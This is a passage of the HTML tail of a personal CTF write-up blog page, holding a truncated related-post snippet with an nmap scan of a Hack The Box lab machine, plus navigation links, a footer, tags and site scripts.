17 18 19 20 └─$ nmap -p- 1337,80,22 backdoor.htb -sC -sV Starting Nmap 7.91 ( https://nmap.org ) at...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Akahack/" class="btn btn-outline-primary" prompt="Older"><p>Akahack easy Crypto</p></a> <a href="/posts/BadByte/" class="btn btn-outline-primary" prompt="Newer"><p>TryHackMe BadByte Walkthrough</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/heapbytes">heapbytes</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/doas/">doas</a> <a class="post-tag" href="/tags/dstat/">dstat</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/websockets/">websockets</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
